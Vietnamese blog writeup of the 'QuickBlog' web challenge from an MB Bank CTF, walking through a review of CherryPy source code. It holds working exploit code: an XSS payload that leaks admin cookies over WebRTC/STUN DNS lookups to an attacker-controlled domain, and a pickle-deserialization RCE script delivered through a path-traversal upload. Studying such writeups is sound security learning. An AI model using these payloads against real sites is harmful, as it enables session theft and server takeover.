---
layout: post
title: QuickBlog - MBBank
date: 2025-08-14 16:09:00 +0700
tags: Writeup MBBankCTF
categories: jekyll update
---

# QuickBlog - MB Bank

* Giao diện web 

Phần login:
![image](/assets/images/CTF/mb-bank/quickblog/image1.png)

Phần register: 
![image](/assets/images/CTF/mb-bank/quickblog/image2.png)

Sau khi đăng ký và đăng nhập thì vào được dashboard: 

![image](/assets/images/CTF/mb-bank/quickblog/image3.png)

![image](/assets/images/CTF/mb-bank/quickblog/image4.png)

## Review Source Code 

![image](/assets/images/CTF/mb-bank/quickblog/image5.png)

 thư mục của project như trên. 

Đọc qua file `requirement.txt`

![image](/assets/images/CTF/mb-bank/quickblog/image6.png)

Từ đây thì có thể đoán web chạy trên web server của CherryPy 18.10.0

Đọc qua file Dockerfile. 

```dockerfile
FROM python:3.11-alpine

# Install dependencies
RUN apk add --update --no-cache gcc build-base musl-dev supervisor chromium chromium-chromedriver

# Add chromium to PATH
ENV PATH="/usr/lib/chromium:${PATH}"

# Copy flag
COPY flag.txt /flag.txt

# Upgrade pip
RUN python -m pip install --upgrade pip

# Setup app
RUN mkdir -p /app

# Add application
WORKDIR /app
COPY challenge .

# Install dependencies
RUN pip install --no-cache-dir -r requirements.txt

# Setup supervisord
COPY conf/supervisord.conf /etc/supervisord.conf

# Setup readflag program
COPY conf/readflag.c /
RUN gcc -o /readflag /readflag.c && chmod 4755 /readflag && rm /readflag.c

# Expose port
EXPOSE 1337

# Prevent outbound traffic
ENV http_proxy="http://127.0.0.1:9999"
ENV https_proxy="http://127.0.0.1:9999"
ENV HTTP_PROXY="http://127.0.0.1:9999"
ENV HTTPS_PROXY="http://127.0.0.1:9999"
ENV no_proxy="127.0.0.1,localhost"

# Create entrypoint and start supervisord
COPY --chown=root entrypoint.sh /entrypoint.sh
RUN chmod +x /entrypoint.sh
ENTRYPOINT ["/entrypoint.sh"]
```

Đọc qua thì cần chú ý các phần như sau: 
- được viết dựa trên python 3.11
- Có sử dụng `chromium`
- Có file `supervisord.conf`
- Có file `readflag.c`
- Có cài đặt proxy và proxy ngoài những domain là `127.0.0.1` hay `localhost` thì nó sẽ đi qua `127.0.0.1:9999`
- Có file `entrypoint.sh` chạy dưới quyền `root` 

Tiến hành đọc qua các file `supervisord.conf`, `readflag.c` và `entrypoint.sh` trước. 

File `supervisord.conf`

![image](/assets/images/CTF/mb-bank/quickblog/image7.png)

Mục tiêu của file này là:
- Chạy tiến trình `python3 app.py` (web server CherryPy) trong thư mục `/app`
- Chạy ở `foreground` thay vì chạy nền 
- Chuyển toàn bộ log của chương trình ra `stdout` và `stderr` để Docker có thể thu log. 
- Không lưu log vào file, không giới hạn kích thước log. 
- Chạy mọi thứ dưới quyền `root`

File `readflag.c`

![image](/assets/images/CTF/mb-bank/quickblog/image8.png)

Mục tiêu file này là:
- Chạy lệnh system để đọc file flag

File `entrypoint.sh`

![image](/assets/images/CTF/mb-bank/quickblog/image9.png)

Mục tiêu file này là: 
- Sinh ra mật khẩu admin ngẫu nhiên 
- Đổi tên flag thành 1 file flag có chuỗi ngẫu nhiên để tránh bị đoán. 
- Bảo vệ chính file này bằng `chmod 600`
- Khởi chạy `supervisord` để quản lý các dịch vụ (web server)

Tiếp theo mình xem qua file `app.py`. Vì file này khá dài nên mình sẽ tách ra từng phần. 

![image](/assets/images/CTF/mb-bank/quickblog/image10.png)

Ở đây chứa các thư viện của project đang dùng. Có các thư viện như `webdriver` và cả `BackgroundScheduler` giống như chạy 1 tiến trình gì đó dưới dạng Background vậy. 

![image](/assets/images/CTF/mb-bank/quickblog/image11.png)

Phần này lấy password admin bằng biến môi trường và set admin_user. 

![image](/assets/images/CTF/mb-bank/quickblog/image12.png)

Tiếp theo các phần dưới này là phần text dưới dạng bài post nhưng được viết dưới dạng `markdown` vậy thì nó web có thể hỗ trợ `markdown`. 

![image](/assets/images/CTF/mb-bank/quickblog/image13.png)

Dưới đây thì các nội dung của post được encode lại dưới dạng base64. Và ghi các thông tin ngày tháng. 

![image](/assets/images/CTF/mb-bank/quickblog/image14.png)

Có thêm 1 biến đếm bài là `post_counter=8`

![image](/assets/images/CTF/mb-bank/quickblog/image15.png)

Tiếp theo, nó là tạo ra 1 đường dẫn cho `uploads` trong thư mục hiện tại trả về đường dẫn tuyệt đối. Nếu đang chạy tại `/app` thì nó sẽ là `/app/uploads` 

Tương tự, cho folder `sessions` là `/app/sessions`

![image](/assets/images/CTF/mb-bank/quickblog/image16.png)

Ở đây thì có 1 hàm validate string thì chỉ cho phép nhập chữ thường hoặc chữ thương chứ `_`

Và có thêm hàm để kiểm tra có phải user `admin` hay ko ?
 
![image](/assets/images/CTF/mb-bank/quickblog/image17.png)

Ở đây thì có 1 hàm `bot_runner` và `bot_thread`. Bot này sẽ login vào dưới dạng admin. Cho nên đây cũng là phần đáng chú ý!!! 

Đến với các chức năng của web này thì được chứa trong 1 class là `Class BlogAPI`

![image](/assets/images/CTF/mb-bank/quickblog/image18.png)

Ở đây nó sẽ chứa các bài post trong tình trạng render `loading...` và có nút `admin` nếu username được trả về là True nếu là Admin. Và tiếp tục render ra template. 

![image](/assets/images/CTF/mb-bank/quickblog/image19.png)

Ở đây thì nếu có được tài khoản admin thì có page dành cho admin có chức năng upload. 

![image](/assets/images/CTF/mb-bank/quickblog/image20.png)

Ở đây thì chỗ render ra link Upload trong trang Admin đã upload.

![image](/assets/images/CTF/mb-bank/quickblog/image21.png)

Phần này thì giải quyết chức năng upload, và mình ko được upload và bị chặn upload từ localhost hay 127.0.0.1, mục đích là ngăn chặn chính server tự gửi file lên. 

Và ở dòng tạo đường dẫn upload `upload_path` nó đã nối `upload_dir` vào trong `file.filename` nghĩa là tên file. Điều này hoàn toàn có thể dẫn tới **path_traversal**. 

![image](/assets/images/CTF/mb-bank/quickblog/image22.png)

Ở đây thực hiện chức năng `get_post_content` nghĩa là đọc nội dung của bài post theo `post_id`

Và hàm login và nó cũng dùng `validate_input` cho username và lưu `session['username']` bằng chính `username` đó lun. Sau đó thì chuyển hướng tới `/` vì như ko có lưu dô mysql dì hết nên ko có sqli đâu nhaaa !!! 

![image](/assets/images/CTF/mb-bank/quickblog/image23.png)

`logout` thì xóa session rồi chuyển về `/login`

Hàm tạo bài viết mới là `new_post` do dài quá nên mình copy vào đây nhá !! 

```python
@cherrypy.expose
	def new_post(self, title=None, content=None):
		username = cherrypy.session.get('username')
		if not username:
			raise cherrypy.HTTPRedirect('/login')

		if title is None or content is None:
			return self.render_template('''
				<div class="header">
					<h1>Create New Post</h1>
					<a href="/" class="button">Back to Posts</a>
				</div>
				<form method="post" action="/new_post" class="post-form">
					<div class="form-group">
						<label>Title:</label>
						<input type="text" name="title" required />
					</div>
					<div class="form-group">
						<label>Content (Automatically base64 encoded):</label>
						<textarea name="content" required rows="10"></textarea>
					</div>
					<button type="submit" class="button button-login">Create Post</button>
				</form>
				<script>
					document.querySelector('form').addEventListener('submit', function(e) {
						e.preventDefault();
						const contentArea = document.querySelector('textarea[name="content"]');
						const rawContent = contentArea.value;
						contentArea.value = btoa(rawContent);
						this.submit();
					});
				</script>
			''')
		else:
			if not validate_input(title):
				return self.render_template('''
					<div class="error">
						Invalid title. Titles can only contain lowercase letters, numbers, and underscores.
						<br><a class="link futuristic-link" href="/new_post">Try again</a>
					</div>
				''')

			remote_addr = cherrypy.request.remote.ip
			if remote_addr in ['127.0.0.1', '::1']:
				return self.render_template('''
					<div class="error">
						Posting from localhost is not allowed.
						<br><a class="link futuristic-link" href="/">Home</a>
					</div>
				''')
   
			if is_admin(username):
				return self.render_template('''
					<div class="error">
						Admin posting is disabled
						<br><a class="link futuristic-link" href="/">Home</a>
					</div>
				''')

			global post_counter
			post_counter += 1
			posts.append({
				'id': post_counter,
				'title': title,
				'content': content,
				'author': username,
				'timestamp': datetime.now().strftime('%Y-%m-%d %H:%M')
			})
			raise cherrypy.HTTPRedirect('/')
```

1. Kiểm tra đăng nhập 
- Lấy `username` từ session 
- Nếu chưa đăng nhập ➡️ chuyển hướng sang `/login` 
2. Trường hợp truy cập form
- Nếu chứ truyền `title` hoặc `content` trả về HTML chứa form nhập bài mới.
- JavaScript trong form sẽ tự động encode Base64 nội dụng trước khi submit ➡️ server sẽ nhận `content` ở dạng Base64. 
3. Xử lý khi submit (POST request) 
3.1. Kiểm tra `title` hợp lệ
- Dùng hàm `validate_input` regex chỉ cho phép `[a-z_]+`, nếu sai thì thông báo lỗi `Invalid title. Titles can only contain lowercase letters, numbers, and underscores.`
3.2. Chặn post từ localhost 
- không cho post từ phía localhost hay 127.0.0.1 
3.3. Chặn admin đăng bài
- Không cho admin đăng bài mới
3.4. Lưu bài mới 
- Tăng `post_counter` để tạo ID mới 
- Lưu bài viết vào list `posts`
- `content` được lưu nguyên Base64 chứ ko decode ở server
- Sau khi lưu ➡️ redirect về trang chủ 

![image](/assets/images/CTF/mb-bank/quickblog/image24.png)

Đây là phần sẽ render ra các template trong đó các file javascript là: 
- `markdown2html.js`
- `app.js` 

![image](/assets/images/CTF/mb-bank/quickblog/image25.png)

Đây là hàm main làm các nhiệm vụ là: 
- Load các file `static`
- bot thread để chạy `BackgroundScheduler()`

Như vậy mình thấy có thêm hai file nữa là `markdown2html.js` và `app.js`

Tiến hành đọc 2 file này thoaiii 😊

File `markdown2html.js`, đọc sơ qua thì file làm nhiệm vụ chuyển đổi các tag dạng `markdown` sang tag `html`:

![image](/assets/images/CTF/mb-bank/quickblog/image26.png)

- Phần này nó sẽ chuyển đổi các tag `<` thành `&lt;` để tránh bị HTML injection. 
Xử lý link và email: 
- Gọi hàm `wraplinks()` và `wrapEmails()` để tự động biến URL hoặc email
- Tách nội dung theo đoạn `\n\n` => sau đó xử lý từng đoạn thành HTML riêng. 

![image](/assets/images/CTF/mb-bank/quickblog/image27.png)

Dùng các biến để set ban đầu cho việc lập trình lúc sau. 

![image](/assets/images/CTF/mb-bank/quickblog/image28.png)

Phần này nó dùng để xử lý khoảng trắng nếu `$~` thì nó xử lý như sau:
- set `insideDollar = false` và `result = ''`
- duyệt qua các ký tự nếu `$` thì `insideDollar = true` và nếu `insideDollar = true` rồi và có ký tự `~` thì `result += &nbsp;`, cúi cùng cộng các ký tự lại. 

![image](/assets/images/CTF/mb-bank/quickblog/image29.png)

![image](/assets/images/CTF/mb-bank/quickblog/image30.png)
- Phần này xử lý bullet lists dựa trên regex là bắt đầu ở đầu dòng có dấu `-`, `+` hoặc `*` và theo sau đó là khoảng trắng thì là bullet list đầy nội dung vào trong thẻ `<li>` sau đó bỏ vào thẻ `<ul>`. 
- Xử lý số cũng theo dạng regex là `\d+` là nhìu số, `\.\` là dấu chấm và `\s` là khoảng trắng sau đó thì được bỏ vào thẻ `<li>` rồi đẩy vào thẻ `<ol>`

```javascript
//HANDLE UNDERLINES FOR H1 & H2
			if (i < lines.length) {
				let nextLine = lines[i + 1];

				if (typeof nextLine != 'undefined') {
					nextLine = lines[i + 1].trim();

					if (/^=+$/.test(nextLine)) {
						const isUsed = processedLines.length > 0;
						if (isUsed) {
							processedLines.push('</p>');
						}
						const slug = line.replace(/[^a-zA-Z0-9]/g, '-').toLowerCase();
						processedLines.push(`<h1 id='${slug}'><a href='#${slug}'><svg viewBox='0 0 24 24'><path d='M20 10V8h-4V4h-2v4h-4V4H8v4H4v2h4v4H4v2h4v4h2v-4h4v4h2v-4h4v-2h-4v-4h4zm-6 4h-4v-4h4v4z' /></svg>${line}</a></h1>`);
						i += 2;

						if (lines.length > i) {
							processedLines.push('<p>');
						}
						continue;

					} else if (/^-+$/.test(nextLine)) {
						const isUsed = processedLines.length > 0;
						if (isUsed) {
							processedLines.push('</p>');
						}
						const slug = line.replace(/[^a-zA-Z0-9]/g, '-').toLowerCase();
						processedLines.push(`<h2 id='${slug}'><a href='#${slug}'><svg viewBox='0 0 24 24'><path d='M20 10V8h-4V4h-2v4h-4V4H8v4H4v2h4v4H4v2h4v4h2v-4h4v4h2v-4h4v-2h-4v-4h4zm-6 4h-4v-4h4v4z' /></svg>${line}</a></h2>`);
						i += 2;

						if (lines.length > i) {
							processedLines.push('<p>');
						}
						continue;
					}
				}
			}
```

Phần này dùng cho xử lý `h1` và `h2` nhưng dưới dạng gạch dưới `=` và `_`

```javascript
//HANDLE HEADERS
			if (line.startsWith('### ')) {
				const isUsed = processedLines.length > 0;
				if (isUsed) {
					processedLines.push('</p>');
				}
				const slug = line.slice(4).replace(/[^a-zA-Z0-9]/g, '-').toLowerCase();
				processedLines.push(`<h3 id='${slug}'><a href='#${slug}'><svg viewBox='0 0 24 24'><path d='M20 10V8h-4V4h-2v4h-4V4H8v4H4v2h4v4H4v2h4v4h2v-4h4v4h2v-4h4v-2h-4v-4h4zm-6 4h-4v-4h4v4z' /></svg>${line.slice(4)}</a></h3>`);
				i++;

				if (lines.length > i) {
					processedLines.push('<p>');
				}
				continue;

			} else if (line.startsWith('## ')) {
				const isUsed = processedLines.length > 0;
				if (isUsed) {
					processedLines.push('</p>');
				}
				const slug = line.slice(3).replace(/[^a-zA-Z0-9]/g, '-').toLowerCase();
				processedLines.push(`<h2 id='${slug}'><a href='#${slug}'><svg viewBox='0 0 24 24'><path d='M20 10V8h-4V4h-2v4h-4V4H8v4H4v2h4v4H4v2h4v4h2v-4h4v4h2v-4h4v-2h-4v-4h4zm-6 4h-4v-4h4v4z' /></svg>${line.slice(3)}</a></h2>`);
				i++;

				if (lines.length > i) {
					processedLines.push('<p>');
				}
				continue;

			} else if (line.startsWith('# ')) {
				const isUsed = processedLines.length > 0;
				if (isUsed) {
					processedLines.push('</p>');
				}
				const slug = line.slice(2).replace(/[^a-zA-Z0-9]/g, '-').toLowerCase();
				processedLines.push(`<h1 id='${slug}'><a href='#${slug}'><svg viewBox='0 0 24 24'><path d='M20 10V8h-4V4h-2v4h-4V4H8v4H4v2h4v4H4v2h4v4h2v-4h4v4h2v-4h4v-2h-4v-4h4zm-6 4h-4v-4h4v4z' /></svg>${line.slice(2)}</a></h1>`);
				i++;

				if (lines.length > i) {
					processedLines.push('<p>');
				}
				continue;
			}
```

Phần này dùng để xử lý các header dạng markdown khi bắt đầu bằng `#` như sau:
- `### ` là cho thẻ `<h3>`
- `## ` là cho thẻ `<h2>`
- `# ` là cho thẻ `<h1>` 

```javascript
//HANDLE CODE BLOCKS
			if (line.startsWith('```')) {
				inCodeBlock = !inCodeBlock;

				if (inCodeBlock) {
					if (processedLines.length > 0) {
						processedLines[processedLines.length - 1] += '</p>';
					}

					codeLanguage = (line.slice(3) == '') ? 'plain' : line.slice(3).toLowerCase();
					const previousLine = lines[i + 1];

					const uuid = uniqid();
					codeLines.push(`<code-header>${getLanguageKey(codeLanguage)}<button class='copy' type='button' onclick="navigator.clipboard.writeText(document.getElementById('${uuid}').textContent)"><svg viewBox='0 0 24 24'><path d='M16 1H4c-1.1 0-2 .9-2 2v14h2V3h12V1zm3 4H8c-1.1 0-2 .9-2 2v14c0 1.1.9 2 2 2h11c1.1 0 2-.9 2-2V7c0-1.1-.9-2-2-2zm0 16H8V7h11v14z' /></svg></button></code-header>`);
					codeLines.push(`<pre language='${codeLanguage}'><code id='${uuid}'>${tokenizeLine(codeLanguage, previousLine)}</code>`);
					i += 2;
					continue;
				}

				codeLanguage = '';
				codeLines[codeLines.length - 1] += '</pre>';
				processedLines.push.apply(processedLines, codeLines);
				codeLines = [];

				if (line.length > 3) {
					processedLines.push('<p>');
					lines[i] = line.slice(3);
					continue;
				}

				if (i < lines.length - 1) {
					processedLines.push('<p>');
				}

				i++;
				continue;
			}

			if (inCodeBlock) {
				codeLines.push(`<code>${tokenizeLine(codeLanguage, line)}</code>`);
				i++;
				continue;
			}

			if (line.endsWith('  ')) {
				line = line.slice(0, line.length - 2) + '<br>';
			}
			
			line = markDownText(line);
```

Trong phần này thì nó handle phần codeblock nghĩa là khi bắt đầu bằng kí tự đặc biệt để thể hiện codeblock thì xử lý như sau: 
- Nếu chưa bắt dầu codeblock mà trước đó là 1 đoạn text thì cuối cùng mình thêm vào `</p>` 
- Xác định codeLanguage của đoạn code do lấy bỏ qua 3 phần dấu ``` 
- Sau đó set codeLanguage lại thành rỗng và thêm thẻ `</pre>` ở phần tử cuối 
- Và xử lý là đưa đoạn code trong codeblock vào trong thẻ `<code>` được bao bởi thẻ `<pre>` 
- Cuối cùng gọi tới hàm `markDownText`

Và mình nhận ra 1 điều là nó ko hoàn toàn escape dấu `'` ở đoạn. 

![image](/assets/images/CTF/mb-bank/quickblog/image31.png)

Khi lấy codeLanguage thì ko thoát dấu `'` thì hoàn toàn có thể bị inject vào để thoát dấu `'`. 

## Khai thác 

![image](/assets/images/CTF/mb-bank/quickblog/image32.png)

Khi đó nó sẽ xử lý như sau: 

![image](/assets/images/CTF/mb-bank/quickblog/image33.png)

Từ đây, mình có thể inject payload này như sau: 

![image](/assets/images/CTF/mb-bank/quickblog/image34.png)

Ứng dụng xử lý như sau: 

![image](/assets/images/CTF/mb-bank/quickblog/image35.png)

Như vậy hoàn toàn mình có thể inject để dẫn đến XSS như sau: 

![image](/assets/images/CTF/mb-bank/quickblog/image36.png)

![image](/assets/images/CTF/mb-bank/quickblog/image37.png)

Nó hoàn toàn xảy ra XSS. Từ đây mình có thể tìm ra bug XSS để cho bot thực hiện nhấp vào để lấy được session của nó. 

Nhưng ở đây thì hoàn toàn không thể thực hiện qua `HTTP` vì nó hoàn toàn đi qua proxy, nếu đi ra internet thì nó qua proxy từ đó dò thì ko đúng `localhost` hay `127.0.0.1` thì nó sẽ cho đi qua port `9999`, mà không có dịch vụ nào chạy port `9999` nên dẫn đến thực hiện lấy cookie qua đây sẽ bị thất bại!!! 

Nhưng ở đây còn 1 kỹ thuật là lấy cookie thông qua DNS. 

Nếu mình truyền payload XSS mà nó trigger thông qua DNS server, trả về các log của DNS trên server của mình.

Ở đây mình viết 1 script như sau:

```javascript
function convertToHex(str) {
    var hex = "";
    for (var i = 0; i < str.length; i++) {
        hex += str.charCodeAt(i).toString(16);
    }
    return hex;
}

function leakCookieViaRTC(domain, cookie) {
    var sectionLength = Math.ceil(cookie.length / 2); 
    for (var i = 0; i < 2; i++) {
        var section = cookie.slice(i * sectionLength, (i + 1) * sectionLength);
        if (section) {
            var hexSection = convertToHex(section);
            var p = new RTCPeerConnection({
                iceSevers: [{
                    urls: `stun:${hexSection}.${domain}`
                }]
            });

            p.createDataChannel("d");
            p.setLocalDescription();
        }
    }
}

leakCookieViaRTC("attacker-dns.com", document.cookie)
```

Giải thích script trên: 
- Hàm `convertToHex()` là chuyển đổi các ký tự ascii sang hexa dạng 16 
- Hàm `leakCookieViaRTC(domain, cookie)` nhận vào hai tham số là `domain` và `cookie`:
    - Đầu tiên nó làm là chia cookie ra hai phần sau đó convert sang hex 
    - Thứ hai là nếu có trả về section thì convert nó sang hex sau đó thực hiện kết nối tới DNS server attacker để nó phân giải tên miền, nhưng ko có nên sẽ trả về log trên server. 
    - Được chạy trong vòng lặp vì đã chia cookie ra làm hai phần 

Như vậy là xong phần trả session cookie về DNS server của mình kiểm soát. Để có bypass và tránh gây lỗi khi nhập trên form của ứng dụng thì mình cần viết 1 script và cũng để sinh payload lun. 

```javascript
def to_ascii_codes(string):
    return "".join(str(hex(ord(c))) for c in string).replace("0x", "\\x").replace("\\xa", "\\x0a")

def xss():
    leak_cookie = f"""
    function convertToHex(str) {{
        var hex = "";
        for (var i = 0; i < str.length; i++) {{
            hex += str.charCodeAt(i).toString(16);
        }}
        return hex;
    }}

    function leakCookieViaRTC(domain, cookie) {{
        var sectionLength = Math.ceil(cookie.length / 2); 
        for (var i = 0; i < 2; i++) {{
            var section = cookie.slice(i * sectionLength, (i + 1) * sectionLength);
            if (section) {{
                var hexSection = convertToHex(section);
                var p = new RTCPeerConnection({{
                    iceServers: [{{
                        urls: `stun:${{hexSection}}.${{domain}}`
                    }}]
                }});

            p.createDataChannel("d");
            p.setLocalDescription();
        }}
    }}
}}

leakCookieViaRTC("8enigbdabex4kpkgjo5tpy1q8he82yqn.oastify.com", document.cookie)
"""
    encoded = to_ascii_codes(leak_cookie)
    parser_xss = f"```json' autofocus tabindex=1 onfocus=eval('{encoded}');//\na\n```"
    return parser_xss

print(xss())
```

Ở đây mình có thêm 1 hàm `to_ascii_codes` để có thể encode khi chạy payload. 

Vì khi trong payload thực hiện nó sẽ đi từ `ascii` => `hex` thì nó sẽ hiển thị như sau: 

![image](/assets/images/CTF/mb-bank/quickblog/image38.png)

Nếu để `0x41` hày `0xa` thì javaScript sẽ hoàn toàn ko hiểu nên cần đổi sang `\x41` và `\x0a`. 

Từ đây mình khai thác DNS server qua Burp Collaborator. 

Sau khi chạy payload:
![image](/assets/images/CTF/mb-bank/quickblog/image39.png)

Và DNS log trả về:
![image](/assets/images/CTF/mb-bank/quickblog/image40.png)

Sau khi decode từ Hex:
![image](/assets/images/CTF/mb-bank/quickblog/image41.png)

Và mình copy đoạn session này để vào admin như sau: 

![image](/assets/images/CTF/mb-bank/quickblog/image42.png)

Như đã phân tích thì trong trang admin có chức năng upload và chức năng này dẫn đến path traversal. 

![image](/assets/images/CTF/mb-bank/quickblog/image43.png)

Nên mình thử upload 1 file và quan sát response!! 

![image](/assets/images/CTF/mb-bank/quickblog/image44.png)

Điểm chú ý là nó dùng hàm để lấy đường dẫn tuyệt đối. 

![image](/assets/images/CTF/mb-bank/quickblog/image45.png)
 
Nhưng nó ko trả về gì hết !!! 

Nên mình thử thay đổi thành `/phuc` rồi vào docker xem sao. 

![image](/assets/images/CTF/mb-bank/quickblog/image46.png)

Mình thấy nó tạo ra 1 folder là `/phuc` lun. Và quan sát trong folder `/app` thì có `sessions`. 

![image](/assets/images/CTF/mb-bank/quickblog/image47.png)

Vì đến đây là hết ý tưởng nên mình thử tìm source của Cherrypy=18.10.0 để đọc thử để xem nó xử lý session như thế nào. 

![image](/assets/images/CTF/mb-bank/quickblog/image48.png)

Ở đây nó xử lý bằng load 1 file lên mà ko có biện pháp bảo vệ và nó được xác định bằng hàm `get_file_path()`

![image](/assets/images/CTF/mb-bank/quickblog/image49.png)

Và ở hàm này thì có biện pháp chặn path traversal. 

Như vậy, mình có ý tưởng vì trong ứng dụng có 1 file `readflag.c` để đọc `flag` bằng `root`. 

Cho nên, nếu mình upload 1 file vào trong thư mục `sessions` và trong file đó lại chứa 1 lệnh để nó chạy lệnh system thì sao. 

```python
import requests, pickle, io, os
HOST, PORT = "127.0.0.1", 1337
CHALLENGE_URL = f"http://{HOST}:{PORT}"
ADMIN_SESSION = "34cff0f4d4950316276caef2a9515aab5aa69fe0"

class PickleRCE(object):
    def __reduce__(self):
        return (os.system,("/readflag > /app/static/flag.txt",))
      
payload = pickle.dumps(PickleRCE())
pickle_file = io.BytesIO(payload)
pickle_file.name = "../../../app/sessions/session-injected"

files = {
    "file": (pickle_file.name, pickle_file, "application/octet-stream")
}
 
cookie_data = {
    "session_id": ADMIN_SESSION
} 
requests.post(f"{CHALLENGE_URL}/upload_file", cookies=cookie_data, files=files)

cookie_data = {
    "session_id": "injected"
} 
requests.get(f"{CHALLENGE_URL}/admin", cookies=cookie_data)
```

Nhưng khi chạy script thì nó và sau đó nếu mình load trong cookie là `injected` thì file đó sẽ chạy os. 

Và mình truy cập được flag. 

![image](/assets/images/CTF/mb-bank/quickblog/image50.png)




